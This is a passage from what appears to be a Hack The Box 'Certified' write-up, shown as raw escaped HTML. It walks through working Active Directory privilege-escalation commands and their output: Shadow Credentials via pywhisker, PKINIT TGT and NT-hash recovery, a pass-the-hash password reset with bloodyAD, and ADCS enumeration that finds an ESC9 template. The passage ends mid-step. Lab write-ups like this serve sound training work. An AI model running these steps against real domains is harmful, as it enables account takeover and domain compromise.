&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Let&amp;rsquo;s now verify, and as it seems we successfully added &lt;code>judith.mader&lt;/code> to the &lt;code>Management&lt;/code> Group.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo net rpc group members &lt;span class="s2">&amp;#34;management&amp;#34;&lt;/span> -U &lt;span class="s2">&amp;#34;certified.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;judith.mader&amp;#34;&lt;/span>%&lt;span class="s2">&amp;#34;judith09&amp;#34;&lt;/span> -S &lt;span class="s2">&amp;#34;certified.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CERTIFIED&lt;span class="se">\j&lt;/span>udith.mader
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CERTIFIED&lt;span class="se">\m&lt;/span>anagement_svc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Since we have now &lt;code>GenericWrite&lt;/code> on the &lt;code>management_svc&lt;/code>, it means we can write to &lt;code>management_svc&lt;/code> attributes, and in this case we will add &lt;code>Shadow Credentials&lt;/code> using &lt;code>pywhisker&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo ntpdate 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:06:42.045696 &lt;span class="o">(&lt;/span>+0100&lt;span class="o">)&lt;/span> +25201.170780 +/- 0.112729 10.10.11.41 s1 no-leap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CLOCK: &lt;span class="nb">time&lt;/span> stepped by 25201.170780
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo python3 /opt/pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Searching &lt;span class="k">for&lt;/span> the target account
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target user found: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>management service,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>certified,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate generated
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating KeyCredential
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> KeyCredential generated with DeviceID: e1b61581-2594-8f88-7648-fc95f608a217
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Updating the msDS-KeyCredentialLink attribute of management_svc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Updated the msDS-KeyCredentialLink attribute of the target object
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Saved PFX &lt;span class="o">(&lt;/span>&lt;span class="c1">#PKCS12) certificate &amp;amp; key at path: Isqd14EX.pfx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Must be used with password: 4PFfbzix0hFHbvg6bdVk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx cj0VvoOI.pfx -pfx-pass &lt;span class="s1">&amp;#39;kcOHYv0aB6Y4fP4wLW9N&amp;#39;&lt;/span> certified.htb/management_svc target.ccache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:53:03,659 minikerberos INFO Loading certificate and key from file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO:minikerberos:Loading certificate and key from file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:53:03,687 minikerberos INFO Requesting TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO:minikerberos:Requesting TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:53:28,432 minikerberos INFO AS-REP encryption key &lt;span class="o">(&lt;/span>you might need this later&lt;span class="o">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO:minikerberos:AS-REP encryption key &lt;span class="o">(&lt;/span>you might need this later&lt;span class="o">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:53:28,434 minikerberos INFO 31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO:minikerberos:31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-16 14:53:28,447 minikerberos INFO Saved TGT to file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO:minikerberos:Saved TGT to file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>target.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ python3 /opt/PKINITtools/getnthash.py -key 31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206 certified.htb/management_svc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using TGT from cache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting ticket to self with PAC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Recovered NT Hash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a091c1832bcdd4677c28b5a6a1295584
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://r4z1o.github.io/p/certified-htb-writeup/Evil-WinRM.png"
width="957"
height="510"
srcset="https://r4z1o.github.io/p/certified-htb-writeup/Evil-WinRM_hu_ab5b56644ec2cfe3.png 480w, https://r4z1o.github.io/p/certified-htb-writeup/Evil-WinRM_hu_e4e2b0a43c5e78f0.png 1024w"
loading="lazy"
alt="Evil-WinRM"
class="gallery-image"
data-flex-grow="187"
data-flex-basis="450px"
>&lt;/p>
&lt;p>The &lt;code>First Degree Object Conctrol&lt;/code> under the Node Info of &lt;code>management_svc&lt;/code> showed us that we have &lt;code>GenericAll&lt;/code> on the &lt;code>ca_operator&lt;/code> object.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound2.png"
width="753"
height="277"
srcset="https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound2_hu_b7f6014d83911bb4.png 480w, https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound2_hu_7095030182ab517b.png 1024w"
loading="lazy"
alt="Bloodhound2"
class="gallery-image"
data-flex-grow="271"
data-flex-basis="652px"
>&lt;/p>
&lt;p>Having &lt;code>GenericAll&lt;/code> on that object means we have complete control over it, so we can change this account&amp;rsquo;s password and take control of it (even not recommended in a real life engagement).&lt;/p>
&lt;p>For that we will use &lt;code>BloodyAD&lt;/code> to do that!&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 --host 10.10.11.41 &lt;span class="nb">set&lt;/span> password ca_operator &lt;span class="s1">&amp;#39;S3cur3P@ssw0rd!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Password changed successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And i&amp;rsquo;ve done it right&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo crackmapexec smb 10.10.11.41 -d certtified.htb -u ca_operator -p S3cur3P@ssw0rd!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows &lt;span class="m">10&lt;/span> / Server &lt;span class="m">2019&lt;/span> Build &lt;span class="m">17763&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC01&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:certtified.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> certtified.htb&lt;span class="se">\c&lt;/span>a_operator:S3cur3P@ssw0rd!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now i used &lt;code>Bloodhound&lt;/code> and tried to see if there are any interesting edges for this user but unfortunately without any results.&lt;/p>
&lt;p>As the name of the account, i thought maybe this is a Certificate Authority, and &lt;code>netexec&lt;/code> is always handy to me when it comes to identifying &lt;code>ADCS&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec ldap 10.10.11.41 -d certtified.htb -u ca_operator -p S3cur3P@ssw0rd! -M adcs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows &lt;span class="m">10&lt;/span> / Server &lt;span class="m">2019&lt;/span> Build &lt;span class="m">17763&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC01&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:certified.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDAP 10.10.11.41 &lt;span class="m">389&lt;/span> DC01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> certtified.htb&lt;span class="se">\c&lt;/span>a_operator:S3cur3P@ssw0rd!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ADCS 10.10.11.41 &lt;span class="m">389&lt;/span> DC01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting LDAP search with search filter &lt;span class="s1">&amp;#39;(objectClass=pKIEnrollmentService)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ADCS 10.10.11.41 &lt;span class="m">389&lt;/span> DC01 Found PKI Enrollment Server: DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ADCS 10.10.11.41 &lt;span class="m">389&lt;/span> DC01 Found CN: certified-DC01-CA
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now i will use &lt;code>certipy-ad&lt;/code> to gather information about Certificate Authority.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ certipy-ad find -u ca_operator -p S3cur3P@ssw0rd! -dc-ip 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Finding certificate templates
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found &lt;span class="m">34&lt;/span> certificate templates
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Finding certificate authorities
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found &lt;span class="m">1&lt;/span> certificate authority
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found &lt;span class="m">12&lt;/span> enabled certificate templates
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get CA configuration &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;certified-DC01-CA&amp;#39;&lt;/span> via CSRA
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Got error &lt;span class="k">while&lt;/span> trying to get CA configuration &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;certified-DC01-CA&amp;#39;&lt;/span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get CA configuration &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;certified-DC01-CA&amp;#39;&lt;/span> via RRP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got CA configuration &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;certified-DC01-CA&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved BloodHound data to &lt;span class="s1">&amp;#39;20250316160850_Certipy.zip&amp;#39;&lt;/span>. Drag and drop the file into the BloodHound GUI from @ly4k
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved text output to &lt;span class="s1">&amp;#39;20250316160850_Certipy.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved JSON output to &lt;span class="s1">&amp;#39;20250316160850_Certipy.json&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see from the results provided by &lt;code>certipy-ad&lt;/code> we can see there is an &lt;code>ESC9&lt;/code> Vulnerability which will allow us to enroll certain Certificate Template, it means we can request certificates that allow us to impersonate other users. Including &lt;em>Domain Admins&lt;/em>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ cat 20250316160850_Certipy.txt
